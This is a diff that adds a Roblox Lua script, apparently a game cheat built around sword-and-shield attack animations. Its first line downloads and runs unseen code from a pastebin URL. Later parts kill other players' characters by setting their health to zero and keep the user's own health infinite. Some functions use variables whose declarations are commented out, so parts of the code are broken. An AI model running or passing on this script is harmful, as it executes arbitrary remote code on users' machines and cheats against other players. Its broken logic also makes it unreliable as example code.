@@ -1,0 +1,446 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/ug4TNhzr'),true))()
+
+local script = game:GetObjects("rbxassetid://13179307551")[1] --13178470959
+script.Parent = game:GetService("Players").LocalPlayer  --Mouse = Player:GetMouse() 
+
+--Mouse = Player:GetMouse() 
+wait(1)
+
+local events = script.Events
+local sfx = script.SFX
+
+local myPlr = game:GetService("Players"):GetPlayerFromCharacter(script.Parent) --Mouse = 
+local myChar =  game:GetService("Players").LocalPlayer.Character 
+local myHuman = myChar.Humanoid
+local myRoot = myChar.HumanoidRootPart
+local myTorso = myChar.Torso
+local myHead = myChar.Head
+
+thing = 0
+local rootJointC0 = myRoot.RootJoint.C0
+--local Mouse = Plr:GetMouse()
+
+local function weldBetween(a, b)
+	local weldd = Instance.new("ManualWeld")
+	weldd.Part0 = a
+	weldd.Part1 = b
+	weldd.C0 = CFrame.new()
+	weldd.C1 = b.CFrame:inverse() * a.CFrame
+	weldd.Parent = a
+	return weldd
+end
+IT = Instance.new
+CF = CFrame.new
+VT = Vector3.new
+RAD = math.rad
+C3 = Color3.new
+UD2 = UDim2.new
+BRICKC = BrickColor.new
+ANGLES = CFrame.Angles
+EULER = CFrame.fromEulerAnglesXYZ
+COS = math.cos
+ACOS = math.acos
+SIN = math.sin
+ASIN = math.asin
+ABS = math.abs
+MRANDOM = math.random
+FLOOR = math.floor
+it = Instance.new
+local sword = script.Sword
+
+local lp = game:GetService("Players").LocalPlayer
+local rs = game:GetService("RunService")
+local stepped = rs.Stepped
+local heartbeat = rs.Heartbeat
+local renderstepped = rs.RenderStepped
+local sg = game:GetService("StarterGui")
+local ws = game:GetService("Workspace")
+local cf = CFrame.new
+local v3 = Vector3.new
+local v3_0 = Vector3.zero
+local inf = math.huge
+
+local cplayer = lp.Character
+
+local v3 = Vector3.new
+
+local function gp(parent, name, className)
+    if typeof(parent) == "Instance" then
+        for i, v in pairs(parent:GetChildren()) do
+            if (v.Name == name) and v:IsA(className) then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local hat2 = gp(cplayer, "MeshPartAccessory", "Accessory")
+local handle2 = gp(hat2, "Handle", "BasePart")
+local att2 = gp(handle2, "att1_Handle", "Attachment")
+att2.Parent = cplayer["Right Arm"]
+att2.Position = Vector3.new(0, -2.8, -0)
+att2.Rotation = Vector3.new(90, -50, 40)
+
+local hat2 = gp(cplayer, "MedivalShield", "Accessory")
+local handle2 = gp(hat2, "Handle", "BasePart")
+local att2 = gp(handle2, "att1_Handle", "Attachment")
+att2.Parent = cplayer["Left Arm"]
+att2.Position = Vector3.new(-0.5, -0, -0)
+att2.Rotation = Vector3.new(-0, 90, 0)
+
+local shield = script.Shield
+function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
+	local NEWWELD = IT(TYPE)
+	NEWWELD.Part0 = PART0
+	NEWWELD.Part1 = PART1
+	NEWWELD.C0 = C0
+	NEWWELD.C1 = C1
+	NEWWELD.Parent = PARENT
+	return NEWWELD
+end
+function ezweld(P1,P2,CFRAME)
+	local ezw = CreateWeldOrSnapOrMotor("Weld",P1,P1,P2,CFRAME,CF(0,0,0))
+	return ezw
+end
+local curpowerw = CF(-0.10,-0.3,0.6)
+local PowerWeld = ezweld(script.Power,myHead,curpowerw)
+local debounce = false
+local canAnim = false
+local FTORSO = script.Torso1
+FTORSO.Parent = myChar
+FTORSO.CFrame = myRoot.CFrame
+weldBetween(myRoot,FTORSO)
+local FTORSOWELD = CreateWeldOrSnapOrMotor("Weld", myRoot, myRoot, FTORSO, CF(0, 0, 0), CF(0, 0, 0))
+FTORSOWELD.C0 = FTORSOWELD.C0 * ANGLES(RAD(0), RAD(0), RAD(0))
+
+RunParticle = FTORSO.Particle.ParticleEmitter
+
+
+GParticle = FTORSO.GParticle.ParticleEmitter
+
+function tween(obj,info,dictionary)
+	game:GetService("TweenService"):Create(obj,info,dictionary):Play()
+end
+
+function playSound(sound,parent)
+	local sound = sound:Clone()
+	sound.PlayOnRemove = true
+	sound.Parent = parent
+	sound:Destroy()
+end
+
+function ragdollChar(char)
+	local human = char:FindFirstChildWhichIsA("Humanoid")
+	if human then
+		human.AutoRotate = false
+		human.PlatformStand = true
+	end
+	for _,obj in pairs(char:GetChildren()) do
+		if obj:IsA("BasePart") then
+			for _,joint in pairs(obj:GetChildren()) do
+				if joint:IsA("Motor6D") then
+					local a0 = Instance.new("Attachment",joint.Part0)
+					a0.Name = "RagdollAttachment0"
+					a0.CFrame = joint.C0
+					local a1 = Instance.new("Attachment",joint.Part1)
+					a1.Name = "RagdollAttachment1"
+					a1.CFrame = joint.C1
+					local socket = Instance.new("BallSocketConstraint",joint.Part0)
+					socket.Attachment0 = a0
+					socket.Attachment1 = a1
+					socket.LimitsEnabled = true
+					socket.TwistLimitsEnabled = true
+					joint.Enabled = false
+				end
+			end
+		end
+	end
+end
+
+function setUp()
+	sword.CFrame = myChar["Right Arm"].CFrame * CFrame.new(-.25,-.75,-1.8) * CFrame.Angles(0,math.rad(180),math.rad(90))
+	local weld = Instance.new("WeldConstraint",sword)
+	weld.Part0 = myChar["Right Arm"]
+	weld.Part1 = sword
+	shield.CFrame = myChar["Left Arm"].CFrame * CFrame.new(-.7,0,0) * CFrame.Angles(0,0,math.rad(225))
+	local weld = Instance.new("WeldConstraint",shield)
+	weld.Part0 = myChar["Left Arm"]
+	weld.Part1 = shield
+	myTorso["Right Shoulder"].C0 = CFrame.new(.5,0.5,0) * CFrame.Angles(0,math.rad(75),math.rad(60)) * CFrame.Angles(math.rad(45),0,0)
+	myTorso["Left Shoulder"].C0 = CFrame.new(-.75,-.1,-.5) * CFrame.Angles(0,math.rad(-75),math.rad(-60)) * CFrame.Angles(math.rad(90),0,0)
+end
+
+function checkStatus()
+	local status
+	if myHuman.FloorMaterial == Enum.Material.Air then
+		status = "Fall"
+	else
+		if myHuman.MoveDirection ~= Vector3.new(0,0,0) then
+			status = "Walk"
+		else
+			status = "Idle"
+		end
+	end
+	return status
+end
+
+function swing()
+	canAnim = true
+	local randomCrit = math.random(5)
+	local randomAnim = math.random(2)
+	if randomCrit == 1 then
+		sword.Trail.Color = ColorSequence.new(Color3.new(0.258824, 1, 0.129412))
+	end
+	sword.Trail.Enabled = true
+	if randomAnim == 1 then
+		tween(myTorso.Neck,TweenInfo.new(.2),{C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),math.rad(30))})
+		tween(myRoot.RootJoint,TweenInfo.new(.2),{C0 = CFrame.Angles(math.rad(90),math.rad(180),math.rad(-45))})
+		tween(myTorso["Right Shoulder"],TweenInfo.new(.2),{C0 = CFrame.new(1,0.5,0) * CFrame.Angles(math.rad(90),math.rad(30),math.rad(60))})
+		tween(myTorso["Left Shoulder"],TweenInfo.new(.2),{C0 = CFrame.new(-1,.25,-.5) * CFrame.Angles(math.rad(15),math.rad(-60),math.rad(-30))})
+		task.wait(.25)
+		tween(myTorso.Neck,TweenInfo.new(.1),{C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),math.rad(-30))})
+		tween(myRoot.RootJoint,TweenInfo.new(.1),{C0 = CFrame.Angles(math.rad(75),math.rad(180),math.rad(45))})
+		tween(myTorso["Right Shoulder"],TweenInfo.new(.1),{C0 = CFrame.new(.8,.5,-.5) * CFrame.Angles(math.rad(60),math.rad(30),math.rad(-30))})
+		tween(myTorso["Left Shoulder"],TweenInfo.new(.1),{C0 = CFrame.new(-1,.25,0) * CFrame.Angles(math.rad(-30),math.rad(-90),0)})
+	else
+		tween(myTorso.Neck,TweenInfo.new(.1),{C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),math.rad(-60))})
+		tween(myRoot.RootJoint,TweenInfo.new(.1),{C0 = CFrame.Angles(math.rad(75),math.rad(180),math.rad(90))})
+		tween(myTorso["Right Shoulder"],TweenInfo.new(.1),{C0 = CFrame.new(.8,.5,-.5) * CFrame.Angles(math.rad(60),math.rad(30),math.rad(-30))})
+		tween(myTorso["Left Shoulder"],TweenInfo.new(.1),{C0 = CFrame.new(-1,.25,0) * CFrame.Angles(math.rad(-30),math.rad(-90),0)})
+		task.wait(.25)
+		tween(myTorso.Neck,TweenInfo.new(.2),{C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),math.rad(30))})
+		tween(myRoot.RootJoint,TweenInfo.new(.2),{C0 = CFrame.Angles(math.rad(90),math.rad(180),math.rad(-45))})
+		tween(myTorso["Right Shoulder"],TweenInfo.new(.2),{C0 = CFrame.new(1,0.5,0) * CFrame.Angles(math.rad(90),math.rad(30),math.rad(60))})
+		tween(myTorso["Left Shoulder"],TweenInfo.new(.2),{C0 = CFrame.new(-1,.25,-.5) * CFrame.Angles(math.rad(15),math.rad(-60),math.rad(-30))})
+	end
+	for _,char in pairs(workspace:GetDescendants()) do
+		local human = char:FindFirstChildWhichIsA("Humanoid")
+		local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart")
+		if myChar ~= char and human and root and human.Health > 0 then
+			local rayP = RaycastParams.new()
+			rayP.FilterDescendantsInstances = {char}
+			rayP.FilterType = Enum.RaycastFilterType.Whitelist
+			local origin = (myRoot.CFrame * CFrame.new(0,0,-5)).Position
+			local result = workspace:Raycast(origin,(root.Position-origin).Unit * 5,rayP)
+			if result then
+				if randomCrit == 1 then
+					human.Health = 100
+					result.Instance.Velocity = CFrame.new(myRoot.Position,result.Instance.Position).LookVector * 50
+					decapitation(result.Instance.Parent)
+					playSound(sfx.Crit,sword)
+				else
+					human.Health = human.Health - math.random(0,0)
+					result.Instance.Velocity = CFrame.new(myRoot.Position,result.Instance.Position).LookVector * 50
+					if human.Health <= 100 then
+						decapitation(result.Instance.Parent)
+					end
+				end
+				playSound(sfx.Slash,sword)
+			end
+		end
+	end
+	if randomCrit == 1 then
+		playSound(sfx.CritSwing,myRoot)
+	else
+		playSound(sfx.Swing,myRoot)
+	end
+	canAnim = false
+	task.wait(.25)
+	sword.Trail.Color = ColorSequence.new(Color3.new(0.533333, 1, 0.52549))
+	sword.Trail.Enabled = false
+end
+
+function decapitation(char)
+	--local human = char:FindFirstChildWhichIsA("Humanoid")
+	local head = char:FindFirstChild("Head")
+	if human and head then
+		--human.RequiresNeck = true
+		--[[head:BreakJoints()
+		head.Velocity = CFrame.new(myRoot.Position,head.Position).LookVector * 20 + Vector3.new(0,math.random(20,50),0)
+		head.RotVelocity = Vector3.new(math.random(-50,50),math.random(-50,50),0)
+		ragdollChar(char)
+		char:BreakJoints()]]
+		playSound(sfx.Splatter,head)
+	end
+end
+
+function charge()
+	canAnim = true
+	sword.Trail.Color = ColorSequence.new(Color3.new(0.298039, 1, 0.219608))
+	sword.Trail.Enabled = true
+	local bodyV  = Instance.new("BodyVelocity",myRoot)
+	bodyV.MaxForce = Vector3.new(math.huge,0,math.huge)
+	local charge = sfx.Charge:Clone()
+	charge.Parent = myRoot
+	charge:Play()
+	RunParticle.Enabled = true
+	local chargeConnection
+	chargeConnection = game:GetService("RunService").Heartbeat:Connect(function()
+		for _,char in pairs(workspace:GetDescendants()) do
+			--local human = char:FindFirstChildWhichIsA("Humanoid")
+			--local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart")
+			if myChar ~= char and human and root and human.Health > 0 then
+				local rayP = RaycastParams.new()
+				rayP.FilterDescendantsInstances = {char}
+				rayP.FilterType = Enum.RaycastFilterType.Whitelist
+				local origin = (myRoot.CFrame * CFrame.new(0,0,-2)).Position
+				local result = workspace:Raycast(origin,(root.Position-origin).Unit * 2,rayP)
+				if result then
+					canAnim = false
+					chargeConnection:Disconnect()
+					bodyV:Destroy()
+					human.Health = 0
+					result.Instance.Velocity = CFrame.new(myRoot.Position,result.Instance.Position).LookVector * 200
+					ragdollChar(char)
+					char:BreakJoints()
+					RunParticle.Enabled = false
+					charge:Pause()
+					playSound(sfx.ChargeHit,sword)
+				end
+			end
+		end
+		bodyV.Velocity = myRoot.CFrame.LookVector * 200
+		local sine = tick() * 120
+		myTorso.Neck.C0 = myTorso.Neck.C0:Lerp(CFrame.new(0,1,-0.25) * CFrame.Angles(math.rad(85),math.rad(180),0) * CFrame.Angles(math.rad(0-math.cos(sine/3.5)*6),0,0) * CFrame.new(0,0.25,0),.25)
+		myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(CFrame.new(0,math.sin(sine/3.5),0) * CFrame.Angles(math.rad(90),math.rad(180),0) * CFrame.Angles(math.rad(5),0,myRoot.RotVelocity.y/20+math.cos(sine/7)/10),.25)
+		myTorso["Right Shoulder"].C0 = myTorso["Right Shoulder"].C0:Lerp(CFrame.new(.5,0.5-math.sin(sine/3.5)/10-.15,0) * CFrame.Angles(0,math.rad(75),math.rad(60)) * CFrame.Angles(math.rad(45),0,0),.25)
+		myTorso["Left Shoulder"].C0 = myTorso["Left Shoulder"].C0:Lerp(CFrame.new(-0.8,1.1-math.sin(sine/3.5)/10-.15,-.5) * CFrame.Angles(0,math.rad(-75),math.rad(-90)) * CFrame.Angles(math.rad(100),0,0),.25)
+		myTorso["Right Hip"].C0 = myTorso["Right Hip"].C0:Lerp(CFrame.new(1,-1+math.cos(sine/7)/2,0) * CFrame.Angles(0,math.rad(90),0) * CFrame.Angles(0,0,math.sin(sine/7)*1.5),.25)
+		myTorso["Left Hip"].C0 = myTorso["Left Hip"].C0:Lerp(CFrame.new(-1,-1-math.cos(sine/7)/2,0) * CFrame.Angles(0,math.rad(-90),0) * CFrame.Angles(0,0,math.sin(sine/7)*1.5),.25)
+		local value1 = 0
+		local value2 = 0
+		local force = myRoot.Velocity * Vector3.new(1,0,1)
+		if force.Magnitude > 2 then
+			local dir = force.Unit
+			value1 = myRoot.CFrame.RightVector:Dot(dir)
+			value2 = myRoot.CFrame.LookVector:Dot(dir)
+		end
+		myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(rootJointC0 * CFrame.Angles(math.rad(value2 * 30), math.rad(-value1 * 30), 0),.25)
+	end)
+	local hitz = false
+	myChar.HumanoidRootPart.Touched:connect(function(Hit)
+		if thing >= 100 then 
+			if hitz == false then hitz = true
+				ragdollChar(myChar) local S = Instance.new("Sound",myChar.HumanoidRootPart)S.SoundId = "rbxassetid://386946017" S.Volume = 3 S:Play()
+				myHuman.Health = 0
+			end
+		end
+	end)
+	local trail = sword.Trail:Clone()
+	trail.Color = ColorSequence.new(Color3.new(0.639216, 1, 0.541176))
+	trail.Attachment0 = myTorso.NeckAttachment
+	trail.Attachment1 = myTorso.WaistCenterAttachment
+	trail.MaxLength = 0
+	trail.Enabled = true
+	trail.Parent = myTorso
+	task.wait(1.5)
+	canAnim = false
+	chargeConnection:Disconnect()
+	game:GetService("Debris"):AddItem(bodyV,0)
+	trail:Destroy()
+	RunParticle.Enabled = false
+	sword.Trail.Enabled = false
+end
+
+local main
+main = game:GetService("RunService").Heartbeat:Connect(function()
+	if myHuman.Health > 0 then
+		myHuman.MaxHealth = math.huge
+		if not debounce then
+			myHuman.WalkSpeed = 30
+		end
+		local status = checkStatus()
+		if status == "Idle" then
+			local sine = tick()*2
+			if not canAnim then
+				myTorso.Neck.C0 = myTorso.Neck.C0:Lerp(CFrame.new(0,1,0) * CFrame.Angles(math.rad(90+math.sin(-sine)*5),math.rad(180),0),.25)
+				myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(CFrame.new(0,math.sin(sine)/10,0) * CFrame.Angles(math.rad(90+math.sin(sine)*5),math.rad(180),0),.25)
+				myTorso["Right Shoulder"].C0 = myTorso["Right Shoulder"].C0:Lerp(CFrame.new(.5,0.5-math.sin(sine)/10-.15,0) * CFrame.Angles(0,math.rad(75),math.rad(60)) * CFrame.Angles(math.rad(45),0,0),.25)
+				myTorso["Left Shoulder"].C0 = myTorso["Left Shoulder"].C0:Lerp(CFrame.new(-.75,-.1-math.sin(sine)/10-.15,-.5) * CFrame.Angles(0,math.rad(-75),math.rad(-60)) * CFrame.Angles(math.rad(90),0,0),.25)
+				myTorso["Right Hip"].C0 = myTorso["Right Hip"].C0:Lerp(CFrame.new(1,-1-math.sin(sine)/15,0) * CFrame.Angles(math.rad(math.sin(-sine)*5),math.rad(85),0),.25)
+				myTorso["Left Hip"].C0 = myTorso["Left Hip"].C0:Lerp(CFrame.new(-1,-1-math.sin(sine)/15,0) * CFrame.Angles(math.rad(math.sin(-sine)*5),math.rad(-85),0),.25)
+			end
+		elseif status == "Walk" then
+			local sine = tick() * (myHuman.WalkSpeed*2)
+			if not canAnim then 
+				myTorso.Neck.C0 = myTorso.Neck.C0:Lerp(CFrame.new(0,1,-0.25) * CFrame.Angles(math.rad(105),math.rad(180),0) * CFrame.Angles(math.rad(0-math.cos(sine/3.5)*6),0,0) * CFrame.new(0,0.25,0),.25)
+				myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(CFrame.new(0,math.sin(sine/3.5),0) * CFrame.Angles(math.rad(90),math.rad(180),0) * CFrame.Angles(math.rad(5),0,myRoot.RotVelocity.y/20+math.cos(sine/7)/10),.25)
+				myTorso["Right Shoulder"].C0 = myTorso["Right Shoulder"].C0:Lerp(CFrame.new(.5,0.5-math.sin(sine/3.5)/10-.15,0) * CFrame.Angles(0,math.rad(75),math.rad(60)) * CFrame.Angles(math.rad(45),0,0),.25)
+				myTorso["Left Shoulder"].C0 = myTorso["Left Shoulder"].C0:Lerp(CFrame.new(-.75,-.1-math.sin(sine/3.5)/10-.15,-.5) * CFrame.Angles(0,math.rad(-75),math.rad(-60)) * CFrame.Angles(math.rad(90),0,0),.25)
+				myTorso["Right Hip"].C0 = myTorso["Right Hip"].C0:Lerp(CFrame.new(1,-1+math.cos(sine/7)/2,0) * CFrame.Angles(0,math.rad(90),0) * CFrame.Angles(0,0,math.sin(sine/7)*1.5),.25)
+				myTorso["Left Hip"].C0 = myTorso["Left Hip"].C0:Lerp(CFrame.new(-1,-1-math.cos(sine/7)/2,0) * CFrame.Angles(0,math.rad(-90),0) * CFrame.Angles(0,0,math.sin(sine/7)*1.5),.25)
+			end
+		elseif status == "Fall" then
+			if not canAnim then
+				if myHuman.Health > 0 then
+					myTorso.Neck.C0 = myTorso.Neck.C0:Lerp(CFrame.new(0,1,0) * CFrame.Angles(math.rad(60),math.rad(180),0),.25)
+					myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(CFrame.Angles(math.rad(90),math.rad(180),0),.25)
+					myTorso["Right Shoulder"].C0 = myTorso["Right Shoulder"].C0:Lerp(CFrame.new(.5,0.5,0) * CFrame.Angles(0,math.rad(75),math.rad(60)) * CFrame.Angles(math.rad(45),0,0),.25)
+					myTorso["Left Shoulder"].C0 = myTorso["Left Shoulder"].C0:Lerp(CFrame.new(-.75,-.1,-.5) * CFrame.Angles(0,math.rad(-75),math.rad(-60)) * CFrame.Angles(math.rad(90),0,0),.25)
+					myTorso["Right Hip"].C0 = myTorso["Right Hip"].C0:Lerp(CFrame.new(1,-.5,-.5) * CFrame.Angles(math.rad(-15),math.rad(90),0),.25)
+					myTorso["Left Hip"].C0 = myTorso["Left Hip"].C0:Lerp(CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15),math.rad(-90),0),.25)
+					repeat wait() until myHuman.FloorMaterial ~= Enum.Material.Air or not canAnim
+				end
+			end
+		end
+		local value1 = 0
+		local value2 = 0
+		local force = myRoot.Velocity * Vector3.new(1,0,1)
+		if force.Magnitude > 2 then
+			local dir = force.Unit
+			value1 = myRoot.CFrame.RightVector:Dot(dir)
+			value2 = myRoot.CFrame.LookVector:Dot(dir)
+		end
+		if not canAnim then
+			myRoot.RootJoint.C0 = myRoot.RootJoint.C0:Lerp(rootJointC0 * CFrame.Angles(math.rad(value2 * 30), math.rad(-value1 * 30), 0),.25)
+		end
+	else
+		main:Disconnect()
+	end
+end)
+
+
+myHuman.PlatformStand = true
+task.delay(.5,function()
+	myChar.Animate:Destroy()
+	myHuman.PlatformStand = false
+end)
+myHuman.HealthChanged:Connect(function()
+	myHuman.Health = math.huge
+end)
+setUp()
+events.LClick.OnClientEvent:Connect(function()
+	if not debounce then
+		debounce = true
+		swing()
+		debounce = false
+	else
+		return
+	end
+end)
+events.KeyCode.OnClientEvent:Connect(function(plr,keyCode)
+	if not debounce then
+		if keyCode == "q" then
+			debounce = true
+			charge()
+			debounce = false
+		end
+	else
+		return
+	end
+end)
+
+local uis = game:GetService("UserInputService")
+uis.InputBegan:Connect(function(input)
+	if input.KeyCode == Enum.KeyCode.G then
+		swing()
+	end
+end)
+
+local uis = game:GetService("UserInputService")
+uis.InputBegan:Connect(function(input)
+	if input.KeyCode == Enum.KeyCode.T then
+		charge()
+	end
+end)
